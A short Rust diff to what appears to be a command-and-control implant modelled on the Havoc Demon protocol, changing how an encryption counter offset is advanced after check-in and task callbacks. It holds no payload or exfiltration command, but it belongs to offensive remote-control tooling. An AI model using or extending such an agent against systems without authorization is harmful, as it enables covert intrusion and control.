@@ -64,7 +64,7 @@ impl PhantomAgent {
             &[],
         )?;
         let _response = self.transport.send(&packet).await?;
-        self.ctr_offset += callback_ctr_blocks(0);
+        self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandCheckin), 0);
         self.callback_seq += 1;
 
         // Fetch queued tasks with a separate COMMAND_GET_JOB request.
@@ -89,7 +89,8 @@ impl PhantomAgent {
                 )?;
                 match self.send_packet(packet).await {
                     Ok(()) => {
-                        self.ctr_offset += callback_ctr_blocks(payload.len());
+                        self.ctr_offset +=
+                            callback_ctr_blocks(callback.command_id(), payload.len());
                         self.callback_seq += 1;
                         if matches!(callback, PendingCallback::Exit { .. }) {
                             exit_requested = true;
@@ -217,7 +218,7 @@ impl PhantomAgent {
                 &payload,
             )?;
             self.send_packet(packet).await?;
-            self.ctr_offset += callback_ctr_blocks(payload.len());
+            self.ctr_offset += callback_ctr_blocks(callback.command_id(), payload.len());
             self.callback_seq += 1;
         }
 
